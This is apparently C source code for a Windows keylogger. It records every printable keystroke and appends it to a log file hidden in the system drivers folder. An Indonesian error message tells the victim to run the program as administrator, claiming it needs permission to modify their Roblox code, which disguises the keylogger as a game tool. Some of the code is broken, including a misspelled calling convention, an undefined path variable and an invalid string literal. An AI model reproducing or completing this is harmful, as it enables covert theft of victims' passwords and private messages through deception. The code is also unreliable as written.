#define _WIN32_WINNT 0x0500

#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include <stdbool.h>

void getFile(FILE * file){
	file = fopen("C:\\Windows\\System32\\drivers\\etc\\log", "a");

	if(file == NULL){
		perror("JALANKAN SEBAGAI ADMINISTRATOR\n
			AGAR PROGRAM MEMILIKI IZIN UNTUK\n
			MENGOTAK-ATIK KODE ROBLOX ANDA\n");
		getchar();
		exit(1);
	}
}

DWORD WNIAPI activateKeylog(LPVOID param)
{
    HWND hwnd=GetConsoleWindow();
    //ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
    //ShowWindow(hwnd,SW_HIDE);

    FILE * fp = (FILE *)param;

    fp = fopen(pathDir,"a");
    if(fp==NULL){
        puts("Sorry! Cant open file");
        exit(1);
    }
    char buffer[5] = {0};
    bool keyDown[94] = {false};
    while (1) {
        for(int i = 32; i < 127; i++){
            buffer[0] = (char)i;
            if ((GetAsyncKeyState(i) & 0x8000) && !keyDown[i-32]) {
                sprintf(buffer, "%c", (char)i);
                fputs(buffer, fp);
                fflush(fp);
                keyDown[i-32] = true;
                printf(buffer);
            }else if (!(GetAsyncKeyState(i) & 0x8000)) {
                keyDown[i-32] = false;
            }            
        }

        Sleep(50);
    }
    
    fclose(fp);
 
 return 0;
}
